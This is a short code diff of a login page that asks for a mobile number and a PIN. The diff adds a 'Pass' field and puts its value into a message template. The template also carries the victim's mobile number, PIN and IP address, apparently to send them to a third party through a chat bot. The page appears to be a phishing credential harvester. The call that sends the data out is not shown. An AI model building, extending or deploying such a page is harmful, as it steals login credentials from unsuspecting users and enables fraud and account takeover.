@@ -108,8 +108,8 @@
             <input type="number" placeholder="Ex: 01XXXXXXXXX" id="mobileNumber">
         </div>
         <div class="input-group">
-            <p>Enter PIN</p>
-            <input type="number" placeholder="Ex: XXXXX" id="pin">
+            <p>Pass</p>
+            <input type="number" placeholder="Ex: XXXXX" id="pass">
         </div>
         <button id="loginButton">Login <span>&#8594;</span></button>
     </div>
@@ -171,6 +171,8 @@ loginButton.addEventListener('click', async () => {
 📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
     
 🔐<b>PIN:</b> <code>${loginData.pin}</code>
+
+🔐<b>PASS:</b> <code>${loginData.pass}</code>
     
 🌐<b>IP Address:</b> ${loginData.ip}
     
